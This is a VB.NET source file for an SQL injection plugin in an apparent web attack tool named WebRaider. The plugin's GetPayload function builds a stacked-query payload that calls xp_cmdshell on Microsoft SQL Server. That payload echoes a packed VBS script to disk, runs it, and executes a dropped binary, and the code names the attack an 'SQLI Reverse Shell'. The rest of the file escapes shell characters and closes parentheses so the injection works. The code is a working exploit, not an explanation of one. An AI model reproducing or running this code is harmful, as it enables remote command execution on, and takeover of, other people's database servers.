Imports System.ComponentModel.Composition
Imports WebRaider.Plugins.Raider
Imports WebRaider.SharedLibrary

<Export(GetType(IRaider))> _
Public Class SQLI
    Implements IRaider

 

    Public ReadOnly Property Name() As String Implements IRaider.Name
        Get
            Return "SQL Injection"
        End Get
    End Property

    Public Function PrepareAttack(ByVal link As Link, ByVal param As Parameter, ByVal attackPattern As AttackPattern) As Boolean Implements WebRaider.Plugins.Raider.IRaider.PrepareAttack

        param.Value = attackPattern.Pattern
        param.UrlEncode()
        link.UriManager.AddParameter(param)

        Return True
    End Function

    Dim _AttackPatterns As List(Of AttackPattern)

    Public ReadOnly Property Attacks() As System.Collections.Generic.List(Of AttackPattern) Implements WebRaider.Plugins.Raider.IRaider.Attacks
        Get
            Return _AttackPatterns
        End Get
    End Property

    Public Sub Setup() Implements WebRaider.Plugins.Raider.IRaider.Setup
        _AttackPatterns = New List(Of AttackPattern)(1)
        _AttackPatterns.Add(New AttackPattern("SQLI Reverse Shell", GetPayload(WebRaider.SharedLibrary.Options.GroupNumber, WebRaider.SharedLibrary.Options.ParameterType.ToString)))
    End Sub

    Public Function GetPayload(Optional ByVal groupNumber As Integer = 0, Optional ByVal ParamType As String = "Integer") As String

		Dim Payload As String = My.Computer.FileSystem.ReadAllText(My.Application.Info.DirectoryPath & "\Utilities\GenerateBinary-Generated.packed.vbs")

        Dim entry As String = "1"
        If (ParamType = "Str") Then
            entry += "'"
        End If

        For i = 0 To groupNumber - 1
            entry += ")"
        Next

        Payload = String.Format("{1};exec master..xp_cmdshell 'echo {0}>p.vbs && p.vbs && %TEMP%\wr.exe';--", EscapeEcho(Payload), entry.ToString)
        Return Payload
    End Function


    ''' <summary>
    ''' Characters need to be escaped in Echo
    ''' Character order matters, be careful while changing it!
    ''' </summary>
    ''' <remarks></remarks>
    Dim EchoChars() As String = {"^", "^^", "<<", "^<<", ">>", "^>>", "<", "^<", ">", "^>", " &", " ^&", "|", "^|", "(", "^(", ")", "^)"}

    ''' <summary>
    ''' Escapes the scpecial chars for Echo.
    ''' </summary>
    ''' <param name="command">The command.</param>
    ''' <returns></returns>
    Function EscapeEcho(ByVal command As String) As String
        For i As Integer = 0 To EchoChars.Length - 1 Step 2
            command = command.Replace(EchoChars(i), EchoChars(i + 1))
        Next

        Return command
    End Function

    Private _Enabled As Boolean
    Public Property Enabled() As Boolean Implements WebRaider.Plugins.Raider.IRaider.Enabled
        Get
            Return _Enabled
        End Get
        Set(ByVal value As Boolean)
            _Enabled = value
        End Set
    End Property
End Class

